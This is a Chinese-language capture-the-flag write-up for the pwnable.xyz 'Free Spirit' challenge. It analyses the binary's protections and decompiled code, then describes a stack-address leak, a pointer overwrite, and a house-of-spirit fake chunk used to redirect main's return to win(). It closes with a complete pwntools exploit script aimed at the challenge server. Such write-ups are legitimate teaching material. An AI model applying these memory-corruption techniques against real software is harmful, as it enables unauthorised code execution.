---
Site: pwnable.xyz
Chalenge: Free Spirit 
---

# pwnable.xyz Free Spirit

### 0x0 前置补偿

`__prinf_chk`函数是一个带有check的`printf`函数,其原型为

```
int __printf_chk (int flag , const char * format );
```

随着flag的值越高,check的等级越高

```
printf_chk`函数可以有效的阻挡格式化字符串的攻击,无法直接使用`%x$p`,也无法使用`%n
```



[House of spirit](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_spirit.c)	

### 0x1 分析

看一下安全性：

```shell
[*] './challenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

关闭了PIE，地址固定了。

这个程序逻辑比较简单，只有三个功能

`main()`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *idx; // rdi
  signed __int64 i; // rcx
  int v5; // eax
  __int64 v7; // [rsp+8h] [rbp-60h]
  char *buf; // [rsp+10h] [rbp-58h]
  char nptr; // [rsp+18h] [rbp-50h]
  unsigned __int64 v10; // [rsp+48h] [rbp-20h]

  v10 = __readfsqword(0x28u);
  setup();
  buf = (char *)malloc(0x40uLL);                // chun idx 0
  while ( 1 )
  {
    while ( 1 )
    {
      _printf_chk(1LL, (__int64)"> ");
      idx = &nptr;
      for ( i = 12LL; i; --i )
      {
        *(_DWORD *)idx = 0;
        idx += 4;
      }
      read(0, &nptr, 0x30uLL);
      v5 = atoi(&nptr);
      if ( v5 != 1 )
        break;
      __asm { syscall; LINUX - sys_read }
    }
    if ( v5 <= 1 )
      break;
    if ( v5 == 2 )
    {
      _printf_chk(1LL, (__int64)"%p\n");
    }
    else if ( v5 == 3 )
    {
      if ( (unsigned int)limit <= 1 )
        _mm_storeu_si128((__m128i *)&v7, _mm_loadu_si128((const __m128i *)buf));
    }
    else
    {
LABEL_16:
      puts("Invalid");
    }
  }
  if ( v5 )
    goto LABEL_16;
  if ( !buf )
    exit(1);
  free(buf);
  return 0;
}
```

首先申请了一个堆`buf`然后三个操作，

`case 1`：向`buf`里`read` `0x20`个字符。

```assembly
.text:0000000000400849 loc_400849:                             ; CODE XREF: main+73↑j
.text:0000000000400849                 mov     rsi, [rsp+68h+buf] ; buf
.text:000000000040084E                 xor     rax, rax
.text:0000000000400851                 xor     rdi, rdi        ; fd
.text:0000000000400854                 mov     rdx, 20h        ; count
.text:000000000040085B                 syscall                 ; LINUX - sys_read
```

`case 2`:

`_printf_chk(1LL, (__int64)"%p\n");`

打印一个栈地址，经过调试可以获取存放`main`函数的返回地址的栈地址。

`case 3`:

```c
if ( (unsigned int)limit <= 1 )
        _mm_storeu_si128((__m128i *)&v7, _mm_loadu_si128((const __m128i *)buf));
```

`limit`是全局变量，自动初始化为`0`。

然后向`v7`位置写入`128bit`也就是`0x10`字节的内容，看栈内局部变量的位置，刚好后`0x8`字节的内容可以覆盖`buf`。

还有一个贴心的函数`win()`：

```c
int win()
{
  return system("cat /flag");
}
```

#### 思路

我们首先通过`case 2`泄漏存放`main`函数的返回地址的栈地址，然后修改`buf`通过`case 3`修改`buf`指向那个地址从而通过`case 1`修改为`win()`函数的位置。

但是我们最后要完美退出`main()`函数，这样意味着我们需要通过最后`free(buf)`，这就需要伪造一个`chunk`通过检查，这里刚好可以用到house of spirit，来构造一个`fake chunk`，并设置`nextchunk->size`，来通过检查。

最后拿到`flag`。

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context(arch = 'amd64' , os = 'linux', log_level='debug')

# p = process('./challenge')
p = remote("svc.pwnable.xyz", 30005)
elf = ELF('./challenge')

def debug(p, cmd):
	gdb.attach(p, cmd)
	pause()

def edit(content):
	p.sendlineafter('> ', '1')
	p.send(content.ljust(0x20, '\x00'))

def change_buf_addr():
	p.sendlineafter('> ', '3')

def get_addr():
	p.sendlineafter('> ', '2')
	return eval(p.recvuntil('\n').strip('\n'))

# get main return address
main_ret = get_addr() + 0x58
print (hex(main_ret))

# change buf to main_ret
payload = flat([
	'\x00'*0x8,
	main_ret
])
edit(payload)
change_buf_addr()

# change main_ret to win and change buf to bss
win_addr = 0x400A3E	
bss_addr = elf.bss()
payload = flat([
	win_addr,
	bss_addr + 0x8
])
edit(payload)
change_buf_addr()
# p.interactive()

# house of spirit
payload = flat([
	0x51,
	bss_addr + 0x58
])
edit(payload)
change_buf_addr()

payload = flat([
	0x21,
	bss_addr + 0x10
])
edit(payload)
change_buf_addr()

# get flag
p.sendlineafter('> ', 'a')
p.interactive()
```